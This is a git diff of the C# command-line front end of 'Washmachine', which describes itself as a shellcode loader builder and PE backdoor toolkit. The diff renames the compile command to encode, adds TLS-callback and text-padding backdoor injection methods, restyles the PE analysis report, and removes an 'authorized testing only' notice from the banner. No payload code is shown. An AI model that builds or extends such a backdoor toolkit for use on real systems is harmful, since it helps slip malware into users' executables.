@@ -3,6 +3,7 @@ using System.Text;
 using System.Text.Json;
 using Spectre.Console;
 using Spectre.Console.Rendering;
+using Washmachine.Cli.Ui;
 using Washmachine.Logging;
 using Washmachine.Models;
 using Washmachine.Services;
@@ -16,19 +17,19 @@ public static class Program
     private static readonly Dictionary<string, List<string>> InputHistory = new(StringComparer.OrdinalIgnoreCase);
     private static readonly string[] RootReplCommands =
     {
-        "compile", "analyze", "backdoor", "strip", "list", "provision", "test", "help",
+        "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "help",
         "banner", "clear", "cls", "exit", "quit", "q"
     };
     private static readonly string[] SubModeCommands = { "help", "back", "exit", "..", "q" };
     private static readonly string[] ListTargets = { "--templates", "--encoders", "--snippets", "--compilers" };
     private static readonly string[] ListTargetsBare = { "templates", "encoders", "snippets", "compilers" };
-    private static readonly string[] BackdoorMethodValues = { "code-cave", "new-section", "section-ext" };
+    private static readonly string[] BackdoorMethodValues = { "code-cave", "new-section", "section-ext", "text-pad", "tls-callback" };
     private static readonly string[] BackdoorEncryptionValues = { "none" };
     private static readonly string[] BackdoorCarrierValues = { "entry-point" };
     private static readonly string[] StripModeValues = { "ep", "entry-point", "section", "all-exec", "range" };
     private static readonly Dictionary<string, string[]> CommandOptionCompletions = new(StringComparer.OrdinalIgnoreCase)
     {
-        ["compile"] = new[]
+        ["encode"] = new[]
         {
             "--shellcode", "-s", "--shellcode-hex", "--shellcode-url", "-u", "--template", "-t",
             "--encoder", "-e", "--envelope", "-v", "--snippet", "--verbose", "--json"
@@ -45,7 +46,7 @@ public static class Program
         ["list"] = ListTargets,
         ["provision"] = Array.Empty<string>(),
         ["test"] = new[] { "--help", "-h" },
-        ["help"] = new[] { "compile", "analyze", "backdoor", "strip", "list", "provision", "test" }
+        ["help"] = new[] { "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "--all" }
     };
     private static bool _isRepl;
 
@@ -78,7 +79,7 @@ public static class Program
 
         return command switch
         {
-            "compile"   => wantsHelp ? PrintCompileUsage() : await RunCompileAsync(cmdArgs),
+            "encode"    => wantsHelp ? PrintEncodeUsage() : await RunEncodeAsync(cmdArgs),
             "analyze"   => wantsHelp ? PrintAnalyzeUsage() : await RunAnalyzeAsync(cmdArgs),
             "backdoor"  => wantsHelp ? PrintBackdoorUsage() : await RunBackdoorAsync(cmdArgs),
             "strip"     => wantsHelp ? PrintStripUsage() : await RunStripAsync(cmdArgs),
@@ -96,13 +97,14 @@ public static class Program
         if (args.Length == 0) return PrintUsage();
         return args[0].ToLowerInvariant() switch
         {
-            "compile"   => PrintCompileUsage(),
+            "encode"    => PrintEncodeUsage(),
             "analyze"   => PrintAnalyzeUsage(),
             "backdoor"  => PrintBackdoorUsage(),
             "strip"     => PrintStripUsage(),
             "list"      => PrintListUsage(),
             "provision" => PrintProvisionUsage(),
             "test"      => PrintTestUsage(),
+            "--all" or "-a" or "all" => PrintExtendedHelp(),
             _ => PrintUsage(),
         };
     }
@@ -117,7 +119,7 @@ public static class Program
             string? input;
             try
             {
-                input = ReadLineWithEditor("[cyan1]washmachine[/] [mediumpurple1]❯[/] ", "root");
+                input = ReadLineWithEditor($"[{UiColors.Header}]washmachine[/] [{UiColors.Accent}]❯[/] ", "root");
             }
             catch (InvalidOperationException)
             {
@@ -214,7 +216,7 @@ public static class Program
             try
             {
                 input = ReadLineWithEditor(
-                    $"[cyan1]washmachine[/] [mediumpurple1]{Markup.Escape(modeName)}[/] [mediumpurple1]>[/] ",
+                    $"[{UiColors.Header}]washmachine[/] [{UiColors.Accent}]{Markup.Escape(modeName)}[/] [{UiColors.Accent}]>[/] ",
                     modeName,
                     modeName);
             }
@@ -261,26 +263,41 @@ public static class Program
 
         void Render()
         {
-            int width = Math.Max(Console.BufferWidth, 1);
-            int currentRenderLines = GetWrappedLineCount(originLeft, buffer.Length, width);
-            int linesToClear = Math.Max(previousRenderLines, currentRenderLines);
-
-            for (int i = 0; i < linesToClear; i++)
+            try
             {
-                int left = i == 0 ? originLeft : 0;
-                Console.SetCursorPosition(left, originTop + i);
-                Console.Write(new string(' ', Math.Max(1, width - left)));
+                int width = Math.Max(Console.BufferWidth, 1);
+                int bufferHeight = Math.Max(Console.BufferHeight, 1);
+
+                // Clamp origin if console was resized (zoom in/out)
+                originTop = Math.Clamp(originTop, 0, bufferHeight - 1);
+                originLeft = Math.Clamp(originLeft, 0, width - 1);
+
+                int currentRenderLines = GetWrappedLineCount(originLeft, buffer.Length, width);
+                int linesToClear = Math.Max(previousRenderLines, currentRenderLines);
+
+                for (int i = 0; i < linesToClear; i++)
+                {
+                    int row = originTop + i;
+                    if (row >= bufferHeight) break;
+                    int left = i == 0 ? originLeft : 0;
+                    Console.SetCursorPosition(left, row);
+                    Console.Write(new string(' ', Math.Max(1, width - left)));
+                }
+
+                Console.SetCursorPosition(originLeft, originTop);
+                Console.Write(buffer.ToString());
+
+                previousRenderLines = currentRenderLines;
+
+                int absoluteIndex = originLeft + cursorIndex;
+                int cursorTop = Math.Min(originTop + (absoluteIndex / width), bufferHeight - 1);
+                int cursorLeft = Math.Clamp(absoluteIndex % width, 0, width - 1);
+                Console.SetCursorPosition(cursorLeft, cursorTop);
             }
-
-            Console.SetCursorPosition(originLeft, originTop);
-            Console.Write(buffer.ToString());
-
-            previousRenderLines = currentRenderLines;
-
-            int absoluteIndex = originLeft + cursorIndex;
-            int cursorTop = originTop + (absoluteIndex / width);
-            int cursorLeft = absoluteIndex % width;
-            Console.SetCursorPosition(cursorLeft, cursorTop);
+            catch (ArgumentOutOfRangeException)
+            {
+                // Console was resized mid-render; safe to ignore
+            }
         }
 
         void ShowCompletionChoices(IReadOnlyList<string> matches)
@@ -618,54 +635,84 @@ public static class Program
     //  Banner
     // ═══════════════════════════════════════════════════════════════════════
 
+    private static readonly string[] FunnyFacts =
+    {
+        "VirtualAlloc: the real estate agent of process memory.",
+        "Your AV just flagged this help text as suspicious.",
+        "Kernel32.dll has been loaded more times than any webpage.",
+        "The first computer virus (Brain, 1986) had better OPSEC than most APTs.",
+        "73% of statistics about malware are made up on the spot.",
+        "CreateRemoteThread walks into a bar. The bouncer says: 'You're not on the list.'",
+        "If debugging is removing bugs, then programming is putting them in.",
+        "There are 10 types of people: those who understand binary and those who don't.",
+        "Why do programmers prefer dark mode? Because light attracts bugs.",
+        "A SQL query walks into a bar, sees two tables and asks: 'Can I join you?'",
+        "UDP joke: I'd tell you one, but you might not get it.",
+        "The average shellcode has more NOPs than a politician's speech.",
+        "Roses are #FF0000, Violets are #0000FF, All my base are belong to you.",
+        "There's no place like 127.0.0.1.",
+        "To understand recursion, you must first understand recursion.",
+    };
+
     private static void ShowBanner()
     {
-        // Figlet banner
-        AnsiConsole.Write(new FigletText("WASHMACHINE").Color(Color.Cyan1));
+        AnsiConsole.WriteLine();
+        AnsiConsole.Write(new FigletText("WASHMACHINE").Color(UiColors.BannerColor));
 
-        // Typing effect for tagline
-        var tagline = "Shellcode Loader Builder & PE Backdoor Toolkit";
-        var dimStyle = new Style(Color.Grey69, decoration: Decoration.Italic);
-        foreach (char c in tagline)
+        // Dynamic catalog counts
+        int templateCount = 0, sectionCount = 0, snippetCount = 0;
+        try
         {
-            AnsiConsole.Write(new Text(c.ToString(), dimStyle));
-            Thread.Sleep(8);
+            var paths = new AppPaths();
+            var snippetService = new YamlCodeSnippetCatalogService(paths);
+            var sections = snippetService.GetAllSections();
+            sectionCount = sections.Count;
+            snippetCount = sections.Sum(s => s.Items.Count);
+            templateCount = snippetService.GetTemplates().Count;
         }
-        AnsiConsole.WriteLine();
-        AnsiConsole.WriteLine();
+        catch { /* catalog not available yet */ }
 
-        // Info bar
-        AnsiConsole.Write(new Rule().RuleStyle("grey42"));
-        var grid = new Grid()
+        // Info bar in a panel
+        var fact = FunnyFacts[Random.Shared.Next(FunnyFacts.Length)];
+        var infoGrid = new Grid()
+            .AddColumn(new GridColumn().NoWrap())
+            .AddColumn(new GridColumn().NoWrap())
             .AddColumn(new GridColumn().NoWrap())
             .AddColumn(new GridColumn().NoWrap())
             .AddColumn(new GridColumn().NoWrap())
             .AddColumn(new GridColumn().NoWrap())
             .AddColumn(new GridColumn().NoWrap());
-        grid.AddRow(
-            "[bold white]v1.0.0[/]",
-            "[dim]|[/]",
-            "[bold cyan1 link=https://github.com/0xhmza]github.com/0xhmza[/]",
-            "[dim]|[/]",
-            "[gold1]For educational & authorized testing only[/]"
+        infoGrid.AddRow(
+            $"[bold {UiColors.Accent}]v1.0.0[/]",
+            $"[{UiColors.Muted}]│[/]",
+            $"[{UiColors.Value}]{templateCount} templates[/]",
+            $"[{UiColors.Muted}]│[/]",
+            $"[{UiColors.Value}]{sectionCount} playbook categories · {snippetCount} snippets[/]",
+            $"[{UiColors.Muted}]│[/]",
+            $"[{UiColors.Value}]5 injection methods[/]"
         );
-        AnsiConsole.Write(grid);
-        AnsiConsole.Write(new Rule().RuleStyle("grey42"));
+
+        AnsiConsole.Write(UsageFormatter.MakePanel("Washmachine", infoGrid));
+
+        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Shellcode Loader Builder & PE Backdoor Toolkit[/]");
+        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]by[/] [{UiColors.Link} link=https://github.com/0xhmza]0xhmza[/]");
         AnsiConsole.WriteLine();
 
-        AnsiConsole.MarkupLine("[dim]Type[/] [cyan1]help[/] [dim]for commands,[/] [cyan1]help <command>[/] [dim]for details[/]");
-        AnsiConsole.MarkupLine("[dim]Keys:[/] [cyan1]↑/↓[/] history  [cyan1]←/→[/] move  [cyan1]Home/End[/] jump  [cyan1]Tab[/] complete");
+        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Type[/] [{UiColors.Accent}]help[/] [{UiColors.Muted}]for commands,[/] [{UiColors.Accent}]help <command>[/] [{UiColors.Muted}]for details,[/] [{UiColors.Accent}]help --all[/] [{UiColors.Muted}]for full reference[/]");
+        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Keys:[/] [{UiColors.Accent}]↑/↓[/] history  [{UiColors.Accent}]←/→[/] move  [{UiColors.Accent}]Home/End[/] jump  [{UiColors.Accent}]Tab[/] complete");
+        AnsiConsole.WriteLine();
+        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]💡 {fact}[/]");
         AnsiConsole.WriteLine();
     }
 
     // ═══════════════════════════════════════════════════════════════════════
-    //  compile
+    //  encode
     // ═══════════════════════════════════════════════════════════════════════
 
-    private static async Task<int> RunCompileAsync(string[] args)
+    private static async Task<int> RunEncodeAsync(string[] args)
     {
         if (args.Length == 0)
-            return await RunSubMode("compile", RunCompileAsync, PrintCompileUsage);
+            return await RunSubMode("encode", RunEncodeAsync, PrintEncodeUsage);
 
         string? shellcodeFilePath = null;
         string? shellcodeHex = null;
@@ -831,7 +878,7 @@ public static class Program
                 : await AnsiConsole.Status()
                     .Spinner(Spinner.Known.Dots)
                     .SpinnerStyle(Style.Parse("cyan"))
-                    .StartAsync("Compiling...", async _ => await compiler.CompileAsync(data));
+                    .StartAsync("Encoding...", async _ => await compiler.CompileAsync(data));
 
             if (jsonOutput)
             {
@@ -854,13 +901,13 @@ public static class Program
 
                 if (result.Success)
                 {
-                    AnsiConsole.Write(new Panel("[green3_1]Compilation succeeded.[/]")
+                    AnsiConsole.Write(new Panel("[green3_1]Encoding succeeded.[/]")
                         .BorderColor(Color.Green)
                         .Border(BoxBorder.Rounded));
                 }
                 else
                 {
-                    AnsiConsole.Write(new Panel($"[red]Compilation failed: {Markup.Escape(result.ConversionResult.Error ?? "unknown")}[/]")
+                    AnsiConsole.Write(new Panel($"[red]Encoding failed: {Markup.Escape(result.ConversionResult.Error ?? "unknown")}[/]")
                         .BorderColor(Color.Red)
                         .Border(BoxBorder.Rounded));
                 }
@@ -918,15 +965,15 @@ public static class Program
             string archShort = result.Is64Bit ? "x64" : "x86";
 
             var headerMarkup = new Markup(
-                $"[bold cyan1]\U0001f52c PE ANALYSIS REPORT[/]\n" +
-                $"[grey63]{new string('\u2500', 60)}[/]\n" +
-                $"[cyan1]File:[/] [white]{Markup.Escape(result.FileName ?? Path.GetFileName(peFile))}[/]     " +
-                $"[cyan1]Size:[/] [white]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]     " +
-                $"[cyan1]Type:[/] [white]{peTypeStr} {archShort}[/]");
+                $"[bold {UiColors.Header}]\U0001f52c PE ANALYSIS REPORT[/]\n" +
+                $"[{UiColors.Muted}]{new string('\u2500', 60)}[/]\n" +
+                $"[{UiColors.Accent}]File:[/] [{UiColors.Value}]{Markup.Escape(result.FileName ?? Path.GetFileName(peFile))}[/]     " +
+                $"[{UiColors.Accent}]Size:[/] [{UiColors.Value}]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]     " +
+                $"[{UiColors.Accent}]Type:[/] [{UiColors.Value}]{peTypeStr} {archShort}[/]");
 
             AnsiConsole.Write(new Panel(headerMarkup)
                 .Border(BoxBorder.Heavy)
-                .BorderColor(Color.Cyan1)
+                .BorderColor(Color.DarkViolet)
                 .Expand());
             AnsiConsole.WriteLine();
 
@@ -935,20 +982,20 @@ public static class Program
             // ══════════════════════════════════════════════════════════
             var overviewLines = new List<string>
             {
-                $"[cyan1]File Name:[/]     [white]{Markup.Escape(result.FileName ?? "")}[/]",
-                $"[cyan1]Size:[/]          [white]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]",
-                $"[cyan1]SHA-256:[/]       [grey63]{Markup.Escape(result.FileHash ?? "N/A")}[/]",
-                $"[cyan1]Architecture:[/]  [white]{Markup.Escape(result.Architecture)}[/]",
-                $"[cyan1]Subsystem:[/]     [white]{Markup.Escape(result.OptionalHeader?.SubsystemString ?? "N/A")}[/]",
-                $"[cyan1]Compiled:[/]      [white]{Markup.Escape(result.CompileTimeFormatted ?? "N/A")}[/]",
-                $"[cyan1]Linker:[/]        [white]{Markup.Escape(result.OptionalHeader?.LinkerVersion ?? "N/A")}[/]",
-                $"[cyan1].NET:[/]          {(result.IsDotNet ? "[gold1]Yes[/]" : "[white]No[/]")}",
+                $"[{UiColors.Accent}]File Name:[/]     [{UiColors.Value}]{Markup.Escape(result.FileName ?? "")}[/]",
+                $"[{UiColors.Accent}]Size:[/]          [{UiColors.Value}]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]",
+                $"[{UiColors.Accent}]SHA-256:[/]       [{UiColors.Muted}]{Markup.Escape(result.FileHash ?? "N/A")}[/]",
+                $"[{UiColors.Accent}]Architecture:[/]  [{UiColors.Value}]{Markup.Escape(result.Architecture)}[/]",
+                $"[{UiColors.Accent}]Subsystem:[/]     [{UiColors.Value}]{Markup.Escape(result.OptionalHeader?.SubsystemString ?? "N/A")}[/]",
+                $"[{UiColors.Accent}]Compiled:[/]      [{UiColors.Value}]{Markup.Escape(result.CompileTimeFormatted ?? "N/A")}[/]",
+                $"[{UiColors.Accent}]Linker:[/]        [{UiColors.Value}]{Markup.Escape(result.OptionalHeader?.LinkerVersion ?? "N/A")}[/]",
+                $"[{UiColors.Accent}].NET:[/]          {(result.IsDotNet ? $"[{UiColors.Warning}]Yes[/]" : $"[{UiColors.Value}]No[/]")}",
             };
 
             var overviewPanel = new Panel(new Markup(string.Join("\n", overviewLines)))
-                .Header("[bold cyan1]File Overview[/]")
+                .Header($"[bold {UiColors.Header}]File Overview[/]")
                 .Border(BoxBorder.Rounded)
-                .BorderColor(Color.Grey42)
+                .BorderColor(UiColors.BoxBorderColor)
                 .Expand();
 
             // Security panel
@@ -958,9 +1005,9 @@ public static class Program
                 var sec = result.Security;
                 string scoreColor = sec.SecurityScore < 40 ? "red1" : sec.SecurityScore < 70 ? "gold1" : "green3_1";
                 string scoreBar = BuildUsageBar(sec.SecurityScore);
-                secContent.Add($"[cyan1]Score:[/] {scoreBar} [{scoreColor}]{sec.SecurityScore}/100[/]");
+                secContent.Add($"[{UiColors.Accent}]Score:[/] {scoreBar} [{scoreColor}]{sec.SecurityScore}/100[/]");
                 if (!string.IsNullOrEmpty(sec.SecurityAssessment))
-                    secContent.Add($"[cyan1]Assessment:[/] [{scoreColor}]{Markup.Escape(sec.SecurityAssessment)}[/]");
+                    secContent.Add($"[{UiColors.Accent}]Assessment:[/] [{scoreColor}]{Markup.Escape(sec.SecurityAssessment)}[/]");
                 secContent.Add("");
 
                 static string FlagL(bool on, string name)
@@ -984,9 +1031,9 @@ public static class Program
             }
 
             var securityPanel = new Panel(new Markup(string.Join("\n", secContent)))
-                .Header("[bold cyan1]Security[/]")
+                .Header($"[bold {UiColors.Header}]Security[/]")
                 .Border(BoxBorder.Rounded)
-                .BorderColor(Color.Grey42)
+                .BorderColor(UiColors.BoxBorderColor)
                 .Expand();
 
             AnsiConsole.Write(new Columns(overviewPanel, securityPanel));
@@ -1002,26 +1049,26 @@ public static class Program
                 {
                     var oh = result.OptionalHeader;
                     headerLines.Add(
-                        $"[cyan1]Entry Point:[/] [mediumpurple1]0x{oh.AddressOfEntryPoint:X8}[/]    " +
-                        $"[cyan1]Image Base:[/] [mediumpurple1]0x{oh.ImageBase:X}[/]    " +
-                        $"[cyan1]Checksum:[/] [mediumpurple1]0x{oh.Checksum:X8}[/]");
+                        $"[{UiColors.Accent}]Entry Point:[/] [mediumpurple1]0x{oh.AddressOfEntryPoint:X8}[/]    " +
+                        $"[{UiColors.Accent}]Image Base:[/] [mediumpurple1]0x{oh.ImageBase:X}[/]    " +
+                        $"[{UiColors.Accent}]Checksum:[/] [mediumpurple1]0x{oh.Checksum:X8}[/]");
                     headerLines.Add(
-                        $"[cyan1]Section Align:[/] [mediumpurple1]0x{oh.SectionAlignment:X}[/]    " +
-                        $"[cyan1]File Align:[/] [mediumpurple1]0x{oh.FileAlignment:X}[/]    " +
-                        $"[cyan1]Size of Image:[/] [mediumpurple1]0x{oh.SizeOfImage:X}[/]");
+                        $"[{UiColors.Accent}]Section Align:[/] [mediumpurple1]0x{oh.SectionAlignment:X}[/]    " +
+                        $"[{UiColors.Accent}]File Align:[/] [mediumpurple1]0x{oh.FileAlignment:X}[/]    " +
+                        $"[{UiColors.Accent}]Size of Image:[/] [mediumpurple1]0x{oh.SizeOfImage:X}[/]");
 
                     if (oh.DllCharacteristicsList.Count > 0)
-                        headerLines.Add($"[cyan1]DLL Chars:[/] [grey63]{Markup.Escape(string.Join(", ", oh.DllCharacteristicsList))}[/]");
+                        headerLines.Add($"[{UiColors.Accent}]DLL Chars:[/] [grey63]{Markup.Escape(string.Join(", ", oh.DllCharacteristicsList))}[/]");
                 }
 
                 if (result.FileHeader != null)
                 {
                     headerLines.Add(
-                        $"[cyan1]Machine:[/] [white]{Markup.Escape(result.FileHeader.MachineString)}[/]    " +
-                        $"[cyan1]Timestamp:[/] [white]{result.FileHeader.TimeDateStampUtc:yyyy-MM-dd HH:mm:ss} UTC[/]");
+                        $"[{UiColors.Accent}]Machine:[/] [white]{Markup.Escape(result.FileHeader.MachineString)}[/]    " +
+                        $"[{UiColors.Accent}]Timestamp:[/] [white]{result.FileHeader.TimeDateStampUtc:yyyy-MM-dd HH:mm:ss} UTC[/]");
 
                     if (result.FileHeader.CharacteristicsList.Count > 0)
-                        headerLines.Add($"[cyan1]Characteristics:[/] [grey63]{Markup.Escape(string.Join(", ", result.FileHeader.CharacteristicsList))}[/]");
+                        headerLines.Add($"[{UiColors.Accent}]Characteristics:[/] [grey63]{Markup.Escape(string.Join(", ", result.FileHeader.CharacteristicsList))}[/]");
                 }
 
                 if (headerLines.Count > 0)
@@ -1029,7 +1076,7 @@ public static class Program
                     AnsiConsole.Write(new Panel(new Markup(string.Join("\n", headerLines)))
                         .Header("[bold dodgerblue2]PE Headers[/]")
                         .Border(BoxBorder.Rounded)
-                        .BorderColor(Color.Grey42)
+                        .BorderColor(UiColors.BoxBorderColor)
                         .Expand());
                     AnsiConsole.WriteLine();
                 }
@@ -1041,15 +1088,15 @@ public static class Program
             {
                 var sectionTable = new Table()
                     .Border(TableBorder.Simple)
-                    .BorderColor(Color.Grey42)
-                    .AddColumn(new TableColumn("[cyan1]Section[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]VirtAddr[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]VirtSize[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]RawAddr[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]RawSize[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]Perms[/]").Centered())
-                    .AddColumn(new TableColumn("[cyan1]Entropy[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]Bar[/]").LeftAligned());
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Section[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtAddr[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtSize[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RawAddr[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RawSize[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Perms[/]").Centered())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Entropy[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Bar[/]").LeftAligned());
 
                 foreach (var sec in result.Sections)
                 {
@@ -1072,7 +1119,7 @@ public static class Program
                 AnsiConsole.Write(new Panel(sectionTable)
                     .Header("[bold dodgerblue2]Sections[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1086,11 +1133,11 @@ public static class Program
 
                 var protTable = new Table()
                     .Border(TableBorder.Simple)
-                    .BorderColor(Color.Grey42)
-                    .AddColumn(new TableColumn("[cyan1]Protection[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]Status[/]").Centered())
-                    .AddColumn(new TableColumn("[cyan1]Protection[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]Status[/]").Centered());
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Protection[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Status[/]").Centered())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Protection[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Status[/]").Centered());
 
                 var allFlags = new List<(string name, bool enabled)>
                 {
@@ -1132,7 +1179,7 @@ public static class Program
                 AnsiConsole.Write(new Panel(protTable)
                     .Header("[bold dodgerblue2]Security Assessment[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1146,13 +1193,13 @@ public static class Program
 
                 var importTable = new Table()
                     .Border(TableBorder.Simple)
-                    .BorderColor(Color.Grey42)
-                    .AddColumn(new TableColumn("[cyan1]DLL[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]Functions[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]Delay[/]").Centered())
-                    .AddColumn(new TableColumn("[cyan1]DLL[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]Functions[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]Delay[/]").Centered());
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]DLL[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Functions[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Delay[/]").Centered())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]DLL[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Functions[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Delay[/]").Centered());
 
                 var importList = result.Imports.Take(20).ToList();
                 for (int ii = 0; ii < importList.Count; ii += 2)
@@ -1215,7 +1262,7 @@ public static class Program
                 AnsiConsole.Write(new Panel(importRows)
                     .Header($"[bold dodgerblue2]Imports ({result.Imports.Count} DLLs, {totalFuncs} functions)[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1227,11 +1274,11 @@ public static class Program
             {
                 var exportTable = new Table()
                     .Border(TableBorder.Simple)
-                    .BorderColor(Color.Grey42)
-                    .AddColumn(new TableColumn("[cyan1]Name[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]Ordinal[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]RVA[/]").RightAligned())
-                    .AddColumn(new TableColumn("[cyan1]Forwarded[/]").LeftAligned());
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Name[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Ordinal[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RVA[/]").RightAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Forwarded[/]").LeftAligned());
 
                 foreach (var exp in result.Exports)
                 {
@@ -1248,7 +1295,7 @@ public static class Program
                 AnsiConsole.Write(new Panel(exportTable)
                     .Header($"[bold dodgerblue2]Exports ({result.TotalExports})[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1269,10 +1316,10 @@ public static class Program
 
                 var resTable = new Table()
                     .Border(TableBorder.Simple)
-                    .BorderColor(Color.Grey42)
-                    .AddColumn(new TableColumn("[cyan1]Type[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]Name[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]Size[/]").RightAligned());
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Type[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Name[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Size[/]").RightAligned());
 
                 foreach (var res in result.Resources)
                 {
@@ -1288,7 +1335,7 @@ public static class Program
                 AnsiConsole.Write(new Panel(new Rows(resContent))
                     .Header($"[bold dodgerblue2]Resources ({result.Resources.Count})[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1299,7 +1346,7 @@ public static class Program
             if (result.Tls != null)
             {
                 var tlsLines = new List<string>();
-                tlsLines.Add($"[cyan1]Callbacks:[/] [white]{result.Tls.NumberOfCallbacks}[/]");
+                tlsLines.Add($"[{UiColors.Accent}]Callbacks:[/] [white]{result.Tls.NumberOfCallbacks}[/]");
 
                 if (result.Tls.CallbackAddresses.Count > 0)
                 {
@@ -1310,7 +1357,7 @@ public static class Program
                 AnsiConsole.Write(new Panel(new Markup(string.Join("\n", tlsLines)))
                     .Header("[bold dodgerblue2]TLS (Thread Local Storage)[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1323,16 +1370,16 @@ public static class Program
 
                 if (result.TotalCodeCaves > 0)
                 {
-                    caveContent.Add(new Markup($"[cyan1]Largest:[/] [white]{result.LargestCodeCave:N0} bytes[/]"));
+                    caveContent.Add(new Markup($"[{UiColors.Accent}]Largest:[/] [white]{result.LargestCodeCave:N0} bytes[/]"));
 
                     var caveTable = new Table()
                         .Border(TableBorder.Simple)
-                        .BorderColor(Color.Grey42)
-                        .AddColumn("[cyan1]Section[/]")
-                        .AddColumn("[cyan1]Offset[/]")
-                        .AddColumn("[cyan1]RVA[/]")
-                        .AddColumn("[cyan1]Size[/]")
-                        .AddColumn("[cyan1]Injectable[/]");
+                        .BorderColor(UiColors.BoxBorderColor)
+                        .AddColumn($"[{UiColors.Accent}]Section[/]")
+                        .AddColumn($"[{UiColors.Accent}]Offset[/]")
+                        .AddColumn($"[{UiColors.Accent}]RVA[/]")
+                        .AddColumn($"[{UiColors.Accent}]Size[/]")
+                        .AddColumn($"[{UiColors.Accent}]Injectable[/]");
 
                     foreach (var cave in result.CodeCaves.Take(10))
                     {
@@ -1359,7 +1406,7 @@ public static class Program
                 AnsiConsole.Write(new Panel(new Rows(caveContent))
                     .Header($"[bold dodgerblue2]Code Caves ({result.TotalCodeCaves} found, {result.TotalCodeCaveSpace:N0} bytes total)[/]")
                     .Border(BoxBorder.Rounded)
-                    .BorderColor(Color.Grey42)
+                    .BorderColor(UiColors.BoxBorderColor)
                     .Expand());
                 AnsiConsole.WriteLine();
             }
@@ -1370,16 +1417,16 @@ public static class Program
             {
                 string overallEntropyColor = result.OverallEntropy < 6.0 ? "green3_1" : result.OverallEntropy < 7.0 ? "gold1" : "red1";
                 var entropyLines = new List<string>();
-                entropyLines.Add($"[cyan1]Overall Entropy:[/]  [{overallEntropyColor}]{result.OverallEntropy:F4}[/]  {BuildEntropyBar(result.OverallEntropy, 15)}");
